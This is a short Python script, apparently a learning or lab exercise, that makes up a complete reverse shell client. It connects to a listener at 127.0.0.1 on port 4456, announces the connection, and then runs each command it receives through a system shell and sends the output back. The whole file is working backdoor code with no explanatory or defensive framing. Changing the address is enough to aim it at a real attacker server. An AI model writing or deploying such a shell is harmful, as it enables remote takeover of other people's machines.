
import socket, subprocess

def execute_system_command(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("127.0.0.1", 4456))

connection.send(b"\n[+] Connection Established.\n")

while True:
    try:
        received_command = connection.recv(1024)
        #print(received_data)
        command_result = execute_system_command(received_command)
        connection.send(command_result)

    except ConnectionResetError:
        pass
    
    except KeyboardInterrupt:
        print("[+] Detected CTRL + C.....Closing App....Please wait...")
        connection.close()
        exit()


connection.close()